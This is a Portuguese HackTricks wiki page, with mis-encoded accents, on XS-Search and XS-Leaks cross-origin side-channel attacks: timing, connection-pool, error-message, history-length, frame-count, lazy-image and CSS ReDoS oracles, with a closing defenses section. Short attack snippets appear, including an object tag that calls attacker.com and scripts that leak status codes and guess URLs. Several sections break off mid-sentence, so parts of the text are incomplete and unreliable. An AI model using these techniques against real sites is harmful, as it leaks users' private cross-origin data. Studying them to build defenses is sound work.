# XS-Search/XS-Leaks

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenha o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informa√ß√µes b√°sicas**

XS-Search √© uma t√©cnica orientada para **exfiltrar informa√ß√µes de origem cruzada** abusando de **ataques de canal lateral**.

Existem diferentes elementos nesse tipo de ataque:

* **Web vulner√°vel**: √© a web de onde queremos exfiltrar algumas informa√ß√µes
* **Web do atacante**: √© a web que o atacante cria contendo o exploit e que a v√≠tima acessa
* **M√©todo de inclus√£o**: √© o m√©todo usado para carregar a Web vulner√°vel a partir da Web do atacante (como window.open, iframe, fetch, tag HTML com href...)
* **T√©cnica de vazamento**: ap√≥s acessar a web vulner√°vel, uma t√©cnica ser√° usada para diferenciar entre o status potencial da web com as informa√ß√µes obtidas do m√©todo de inclus√£o usado.
* **Estados**: os 2 poss√≠veis estados que a web vulner√°vel pode ter dependendo da v√≠tima que queremos diferenciar.
* **Diferen√ßas detect√°veis**: estas s√£o as informa√ß√µes que o atacante tem que tentar decidir o status da web vulner√°vel

### Diferen√ßas detect√°veis

Para distinguir entre os 2 estados da p√°gina vulner√°vel, v√°rias coisas podem ser observadas:

* **C√≥digo de status**. Um atacante pode distinguir **diferentes c√≥digos de status de resposta HTTP** de origem cruzada (por exemplo, erros do servidor, erros do cliente ou erros de autentica√ß√£o).
* **Uso de API**. Esta diferen√ßa detect√°vel permite que um atacante detecte o **uso de APIs da Web** em p√°ginas, permitindo que um atacante infira se uma p√°gina de origem cruzada est√° usando uma API da Web JavaScript espec√≠fica.
* **Redirecionamentos**. √â poss√≠vel detectar se um aplicativo da web **navegou o usu√°rio para uma p√°gina diferente**. Isso n√£o se limita a redirecionamentos HTTP, mas tamb√©m inclui redirecionamentos acionados por JavaScript ou HTML.
* **Conte√∫do da p√°gina**. Essas diferen√ßas detect√°veis **aparecem no corpo da resposta HTTP** ou em sub-recursos inclu√≠dos pela p√°gina. Por exemplo, isso poderia ser o **n√∫mero de quadros inclu√≠dos** (cf. XS-Leak no Gitlab) ou diferen√ßas de tamanho de imagens.
* **Cabe√ßalho HTTP**. Um atacante pode detectar a presen√ßa de um **cabe√ßalho de resposta HTTP espec√≠fico** e pode ser capaz de reunir seu valor. Isso inclui cabe√ßal
```html
<object data="//example.com/404">
  <object data="//attacker.com/?error"></object>
</object>
```
Neste caso, se `example.com/404` n√£o for encontrado, `attacker.com/?error` ser√° carregado.

### Tempo de carregamento

* **M√©todos de inclus√£o**: Elementos HTML
* **Diferen√ßa detect√°vel**: Tempo (geralmente devido ao conte√∫do da p√°gina, c√≥digo de status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumo**: A API \*\*\*\* [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. No entanto, outros rel√≥gios podem ser usados, como a [**API PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming), que pode identificar tarefas em execu√ß√£o por mais de 50ms.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) outro exemplo em:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Tempo de carregamento + Tarefa pesada for√ßada

Essa t√©cnica √© como a anterior, mas o **atacante** tamb√©m **for√ßar√°** alguma a√ß√£o a levar um **tempo relevante** quando a **resposta for positiva ou negativa** e medir√° esse tempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Tempo de descarregamento / beforeunload

* **M√©todos de inclus√£o**: Frames
* **Diferen√ßa detect√°vel**: Tempo (geralmente devido ao conte√∫do da p√°gina, c√≥digo de status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumo**: O rel√≥gio [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) pode ser usado para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios podem ser usados.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Os eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) e [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) podem ser usados para medir o tempo que leva para buscar um recurso. Isso funciona porque o **`beforeunload`** √© acionado quando o navegador faz uma **nova solicita√ß√£o de navega√ß√£o**, enquanto o **`unload`** √© acionado quando essa **navega√ß√£o realmente ocorre**. De
### Loop de Eventos Ocupado <a href="#busy-event-loop" id="busy-event-loop"></a>

* **M√©todos de Inclus√£o**:
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao conte√∫do da p√°gina, c√≥digo de status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Resumo:** Mede o tempo de execu√ß√£o de um web locking o loop de eventos de uma thread e cronometrando **quanto tempo leva para o loop de eventos ficar dispon√≠vel novamente**.
* **Exemplo de c√≥digo**:

Uma das principais vantagens dessa t√©cnica √© sua capacidade de contornar o Isolamento de Site, pois a origem do atacante pode influenciar a execu√ß√£o de outra origem.

{% hint style="warning" %}
Em uma execu√ß√£o de tempo, √© poss√≠vel **eliminar** **fatores de rede** para obter **medi√ß√µes mais precisas**. Por exemplo, carregando os recursos usados pela p√°gina antes de carreg√°-la.
{% endhint %}

### Pool de Conex√£o

* **M√©todos de Inclus√£o**: Solicita√ß√µes JavaScript
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao conte√∫do da p√°gina, c√≥digo de status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Resumo:** Um atacante pode bloquear todos os soquetes, exceto 1, carregar a web de destino e, ao mesmo tempo, carregar outra p√°gina, o tempo at√© que a √∫ltima p√°gina comece a carregar √© o tempo que a p√°gina de destino levou para carregar.
* **Exemplo de c√≥digo**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Os navegadores usam soquetes para se comunicar com servidores. Como o sistema operacional e o hardware em que ele √© executado t√™m recursos limitados, **os navegadores t√™m que impor um limite**. Para explorar a exist√™ncia desse limite, os atacantes podem:

1. Verifique qual √© o limite do navegador, por exemplo, 256 soquetes globais.
2. Bloqueie 255 soquetes por um longo per√≠odo de tempo, realizando 255 solicita√ß√µes a hosts diferentes que simplesmente penduram a conex√£o.
3. Use o 256¬∫ soquete realizando uma solicita√ß√£o √† p√°gina de destino.
4. Realize uma 257¬™ solicita√ß√£o a outro host. Como todos os soquetes est√£o sendo usados ‚Äã‚Äã(nas etapas 2 e 3), essa solicita√ß√£o deve esperar at√© que o pool receba um soquete dispon√≠vel. Esse per√≠odo de espera fornece ao atacante o tempo de sincroniza√ß√£o da rede do 256¬∫ soquete, que pertence √† p√°gina de destino. Isso funciona porque os 255 soquetes na etapa 2 ainda est√£o bloqueados, portanto, se o pool receber um soquete dispon√≠vel, isso foi causado pela libera√ß√£o do soquete na etapa 3. O tempo para liberar o 256¬∫ soquete est√° diretamente conectado ao tempo necess√°rio para concluir a solicita√ß√£o.

Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Pool de Conex√£o por Destino

* **M√©todos de Inclus√£o**: Solicita√ß√µes JavaScript
* **Diferen√ßa Detect√°vel**: Tempo (geralmente devido ao conte√∫do da p√°gina, c√≥digo de status)
*
### Service Worker

* **M√©todos de inclus√£o**: Frames
* **Diferen√ßa detect√°vel**: Uso da API
* **Mais informa√ß√µes**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Resumo:** Detecte se um service worker est√° registrado para uma origem espec√≠fica.
* **Exemplo de c√≥digo**:

Os service workers s√£o contextos de script orientados a eventos que s√£o executados em uma origem. Eles s√£o executados em segundo plano de uma p√°gina da web e podem interceptar, modificar e **armazenar em cache recursos** para criar aplicativos da web offline.\
Se um **recurso armazenado em cache** por um **service worker** √© acessado via **iframe**, o recurso ser√° **carregado a partir do cache do service worker**.\
Para detectar se o recurso foi **carregado a partir do cache do service worker**, a **API de desempenho** pode ser usada.\
Isso tamb√©m pode ser feito com um ataque de temporiza√ß√£o (verifique o artigo para obter mais informa√ß√µes).

### Cache

* **M√©todos de inclus√£o**: Fetch API
* **Diferen√ßa detect√°vel**: Temporiza√ß√£o
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Resumo:** Detecte se um recurso foi armazenado em cache.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Usando a [API de desempenho](xs-search.md#performance-api), √© poss√≠vel verificar se um recurso est√° armazenado em cache.\
Para mais informa√ß√µes: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)

### Dura√ß√£o da Rede

* **M√©todos de inclus√£o**: Fetch API
* **Diferen√ßa detect√°vel**: Conte√∫do da p√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Resumo:** √â poss√≠vel recuperar a dura√ß√£o da rede de uma solicita√ß√£o da API `performance`.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## T√©cnica de Mensagens de Erro

### Erro de M√≠dia

* **M√©todos de inclus√£o**: Elementos HTML (V√≠deo, √Åudio)
* **Diferen√ßa detect√°vel**: C√≥digo de status
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Resumo:** No FF, √© poss√≠vel vazar com precis√£o o c√≥digo de status de uma solicita√ß√£o de origem cruzada.
* **Exemplo de c√≥digo**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
  document.getElementById("log").innerHTML += msg;
}

function startup() {
  let audioElement = document.getElementById("audio");
 // "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
  document.getElementById("startTest").addEventListener("click", function() {
    audioElement.src = document.getElementById("testUrl").value;
  }, false);
  // Create the event handler
  var errHandler = function() {
    let err = this.error;    
    let message = err.message;
    let status = "";
    
    // Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
    // Firefox error.message when the request loads successfully: "Failed to init decoder"
    if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
      status = "Success";
    }else{
      status = "Error";
    }
    displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
  };
  audioElement.onerror = errHandler;
}
```
A propriedade de mensagem da interface **`MediaError`** cont√©m uma **string diferente para recursos que s√£o carregados com sucesso**. Isso permite que um atacante infira o status de resposta para um recurso de origem cruzada.

### Erro de CORS

* **M√©todos de inclus√£o**: Fetch API
* **Diferen√ßa detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo:** Em SA, as mensagens de erro de CORS vazam a URL completa de redirecionamentos.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Essa t√©cnica permite que um atacante vaze o alvo de um redirecionamento que √© iniciado por um site de origem cruzada.

O CORS permite que recursos da web publicamente acess√≠veis sejam lidos e usados a partir de qualquer site. Nos navegadores baseados em Webkit, √© poss√≠vel **acessar as mensagens de erro de CORS quando uma solicita√ß√£o CORS falha**. Um atacante pode enviar uma solicita√ß√£o habilitada para CORS para um site de destino que **redireciona** com base no estado do usu√°rio. Quando o navegador nega a solicita√ß√£o, a **URL completa do destino do redirecionamento √© vazada** na mensagem de erro. Com esse ataque, √© poss√≠vel detectar redirecionamentos, vazar locais de redirecionamento e par√¢metros de consulta sens√≠veis.

### Erro de SRI

* **M√©todos de inclus√£o**: Fetch API
* **Diferen√ßa detect√°vel**: Cabe√ßalho
* **Mais informa√ß√µes**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Resumo:** Em SA, as mensagens de erro de CORS vazam a URL completa de redirecionamentos.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Um atacante pode vazar o tamanho das respostas de origem cruzada devido a **mensagens de erro verbosas**.

O atributo de integridade define um hash criptogr√°fico pelo qual o navegador pode verificar se um recurso buscado n√£o foi manipulado. Esse mecanismo de seguran√ßa √© chamado de Subresource Integrity (SRI). √â usado para verifica√ß√£o de integridade de recursos servidos por redes de entrega de conte√∫do (CDNs). Para evitar vazamentos de dados, os recursos de origem cruzada devem ser **habilitados para CORS**. Caso contr√°rio, a resposta n√£o √© eleg√≠vel para valida√ß√£o de integridade. Semelhante ao vazamento de erro de CORS XS-Leak, √© poss√≠vel capturar a **mensagem de erro ap√≥s uma solicita√ß√£o de busca com um atributo de integridade falhar**. Um atacante pode for√ßadamente **disparar** esse **erro** em qualquer solicita√ß√£o especificando um **valor de hash falso**. Em SA, essa mensagem de erro vaza o comprimento do conte√∫do do recurso solicitado. Um atacante pode usar esse vazamento para detectar diferen√ßas no tamanho da resposta, o que permite poderosos ataques XS-Leak.

### Viola√ß√£o/Detec√ß√£o de CSP

* **M√©todos de inclus√£o**: Pop-ups
* **Diferen√ßa detect√°vel**: C√≥digo de status
* **Mais informa√ß√µes**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Arch
### Comprimento M√°ximo de URL - Lado do Cliente

* **M√©todos de Inclus√£o**: Pop-ups
* **Diferen√ßa Detect√°vel**: C√≥digo de Status / Conte√∫do
* **Mais informa√ß√µes**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Resumo:** Detecte diferen√ßas nas respostas porque o comprimento da resposta de redirecionamento pode ser muito grande para uma solicita√ß√£o que uma diferen√ßa possa ser notada.
* **Exemplo de c√≥digo**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

De acordo com a [documenta√ß√£o do Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), o comprimento m√°ximo de URL do Chrome √© de 2MB.

> Em geral, a _plataforma web_ n√£o tem limites no comprimento de URLs (embora 2^31 seja um limite comum). O _Chrome_ limita os URLs a um comprimento m√°ximo de **2MB** por raz√µes pr√°ticas e para evitar problemas de nega√ß√£o de servi√ßo na comunica√ß√£o entre processos.

Portanto, se o **URL de redirecionamento respondido for maior em um dos casos**, √© poss√≠vel fazer com que ele redirecione com um **URL maior que 2MB** para atingir o **limite de comprimento**. Quando isso acontece, o Chrome mostra uma p√°gina **`about:blank#blocked`**.

A **diferen√ßa percept√≠vel** √© que se o **redirecionamento** foi **conclu√≠do**, `window.origin` lan√ßa um **erro** porque uma origem cruzada n√£o pode acessar essa informa√ß√£o. No entanto, se o **limite** foi **atingido** e a p√°gina carregada foi **`about:blank#blocked`**, a **`origin`** da janela permanece a do **pai**, que √© uma informa√ß√£o **acess√≠vel**.

Todas as informa√ß√µes extras necess√°rias para atingir os **2MB** podem ser adicionadas por meio de um **hash** na URL inicial para que seja **usado no redirecionamento**.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### M√°ximo de Redirecionamentos

* **M√©todos de Inclus√£o**: Fetch API, Frames
* **Diferen√ßa Detect√°vel**: C√≥digo de Status
* **Mais informa√ß√µes**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Resumo:** Abusa do limite de redirecionamentos para detectar redirecionamentos.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Se o n√∫mero **m√°ximo** de **redirecionamentos** a seguir de um navegador for **20**, um invasor poderia tentar carregar sua p√°gina com **19 redirecionamentos** e finalmente **enviar a v√≠tima** para a p√°gina testada. Se um **erro** for acionado, ent√£o a p√°gina estava tentando **redirecionar a v√≠tima**.

### Comprimento do Hist√≥rico

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Redirecionamentos
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Resumo:** O c√≥digo JavaScript manipula o hist√≥rico do navegador e pode ser acessado pela propriedade length.
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

A API de Hist√≥rico permite que o c√≥digo JavaScript manipule o hist√≥rico do navegador, que **salva as p√°ginas visitadas por um usu√°rio**. Um invasor pode usar a propriedade length como um m√©todo de inclus√£o: para detectar navega√ß√µes em JavaScript e HTML.\
**Verificando `history.length`**, fazendo um usu√°rio **navegar** para uma p√°gina, **voltar** para ela **de volta** para a mesma origem e **verificando** o novo valor de **`history.length`**.

### Comprimento do Hist√≥rico com a mesma URL

* **M√©todos de Inclus√£o**: Frames, Pop-ups
* **Diferen√ßa Detect√°vel**: Se a URL √© a mesma que a adivinhada
* **Resumo:** √â poss√≠vel adivinhar se a localiza√ß√£o de um frame/pop-up est√° em uma URL espec√≠fica abusando do comprimento do hist√≥rico.
* **Exemplo de c√≥digo**: Abaixo

Um invasor poderia usar o c√≥digo JavaScript para **manipular a localiza√ß√£o do frame/pop-up para uma adivinhada** e **imediatamente** **mud√°-la para `about:blank`**. Se o comprimento do hist√≥rico aumentar, significa que a URL estava correta e teve tempo para **aumentar porque a URL n√£o √© recarregada se for a mesma**. Se n√£o aumentar, significa que ele **tentou carregar a URL adivinhada** mas porque **imediatamente depois** carregou **`about:blank`**, o **comprimento do hist√≥rico nunca aumentou** ao carregar a URL adivinhada.
```javascript
async function debug(win, url) {
    win.location = url + '#aaa';
    win.location = 'about:blank';
    await new Promise(r => setTimeout(r, 500));
    return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Contagem de Frames

* **M√©todos de inclus√£o**: Frames, Pop-ups
* **Diferen√ßa detect√°vel**: Conte√∫do da p√°gina
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Resumo:** Ler o n√∫mero de frames (window.length).
* **Exemplo de c√≥digo**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Contar o **n√∫mero de frames em uma p√°gina da web** aberta via `iframe` ou `window.open` pode ajudar a identificar o **status do usu√°rio sobre essa p√°gina**.\
Al√©m disso, se a p√°gina tiver sempre o mesmo n√∫mero de frames, verificar **continuamente** o n√∫mero de frames pode ajudar a identificar um **padr√£o** que pode vazar informa√ß√µes.

Um exemplo dessa t√©cnica √© que no Chrome, um **PDF** pode ser **detectado** com **contagem de frames** porque um `embed` √© usado internamente. Existem [Par
### Busca de Tempo

* **M√©todos de inclus√£o**: Fetch API
* **Diferen√ßa detect√°vel**: Tempo (geralmente devido ao conte√∫do da p√°gina, c√≥digo de status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **Resumo:** A API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o. Outros rel√≥gios podem ser usados.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Busca Cruzada de Janelas

* **M√©todos de inclus√£o**: Pop-ups
* **Diferen√ßa detect√°vel**: Tempo (geralmente devido ao conte√∫do da p√°gina, c√≥digo de status)
* **Mais informa√ß√µes**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **Resumo:** A API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) pode ser usada para medir quanto tempo leva para realizar uma solicita√ß√£o usando `window.open`. Outros rel√≥gios podem ser usados.
* **Exemplo de c√≥digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com facilidade, usando as **ferramentas da comunidade mais avan√ßadas do mundo**.\
Acesse hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Com HTML ou Re Inje√ß√£o

Aqui voc√™ pode encontrar t√©cnicas para exfiltrar informa√ß√µes de um HTML de origem cruzada **injetando conte√∫do HTML**. Essas t√©cnicas s√£o interessantes em casos em que, por qualquer motivo, voc√™ pode **injetar HTML, mas n√£o pode injetar c√≥digo JS**.

### Marca√ß√£o Pendurada

{% content-ref url="dangling-markup-html-scriptless-injection.md" %}
[dangling-markup-html-scriptless-injection.md](dangling-markup-html-scriptless-injection.md)
{% endcontent-ref %}

### Carregamento Lento de Imagem

Se voc√™ precisa **exfiltrar conte√∫do** e pode **adicionar HTML anterior ao segredo**, voc√™ deve verificar as **t√©cnicas comuns de marca√ß√£o pendurada**.\
No entanto, se por qualquer motivo voc√™ **PRECISAR** faz√™-lo **caractere por caractere** (talvez a comunica√ß√£o seja via um cache hit), voc√™ pode usar esse truque.

**Imagens** em HTML t√™m um atributo "**loading**" cujo valor pode ser "**lazy**". Nesse caso, a imagem ser√° carregada quando for visualizada e n√£o enquanto a p√°gina estiver carregando:
```html
<img src=/something loading=lazy >
```
Portanto, o que voc√™ pode fazer √© **adicionar muitos caracteres aleat√≥rios** (por exemplo, **milhares de "W"**) para **preencher a p√°gina da web antes do segredo**. Fazemos isso para que a imagem n√£o seja carregada no in√≠cio.

No entanto, voc√™ faz o **bot acessar a p√°gina** com algo como
```
#:~:text=SECR
```
Ent√£o a p√°gina da web ser√° algo como: **`https://vitima.com/post.html#:~:text=SECR`**

Onde post.html cont√©m os caracteres lixo do atacante e a imagem de carregamento lento e, em seguida, o segredo do bot √© adicionado.

O que este texto far√° √© fazer com que o bot acesse qualquer texto na p√°gina que contenha o texto `SECR`. Como esse texto √© o segredo e est√° logo abaixo da imagem, a imagem s√≥ ser√° carregada se o segredo adivinhado estiver correto. Ent√£o, voc√™ tem seu or√°culo para exfiltrar o caractere secreto por caractere.

Alguns exemplos de c√≥digo para explorar isso: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

Encontre **outro exemplo usando carregamento lento** aqui:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Se `jQuery(location.hash)` for usado, √© poss√≠vel descobrir por meio de temporiza√ß√£o **se algum conte√∫do HTML existe**, isso porque se o seletor `main[id='site-main']` n√£o corresponder, n√£o √© necess√°rio verificar o restante dos **seletores**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Inje√ß√£o de CSS

{% content-ref url="xs-search/css-injection/" %}
[inje√ß√£o de CSS](xs-search/css-injection/)
{% endcontent-ref %}

## Defesas

Nesta se√ß√£o, voc√™ pode encontrar parte das mitiga√ß√£o recomendadas em [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf), no entanto, h√° mais mitiga√ß√£o em cada se√ß√£o do wiki [https://xsleaks.dev/](https://xsleaks.dev/). D√™ uma olhada l√° para obter mais informa√ß√µes sobre como se proteger contra essas t√©cnicas.

### Mitiga√ß√µes do M√©todo de Inclus√£o

* **Elementos HTML**. Pode-se usar o **cabe√ßalho CORP para controlar se as p√°ginas podem incorporar um recurso**. O CORP pode ser definido como mesma origem ou mesmo site e bloqueia qualquer solicita√ß√£o de origem cruzada ou respectivamente de site cruzado para esse recurso. No **lado do cliente**, os navegadores baseados em Chromium usam o algoritmo **CORB** para decidir se as solicita√ß√µes de recursos de origem cruzada devem ser permitidas ou negadas.
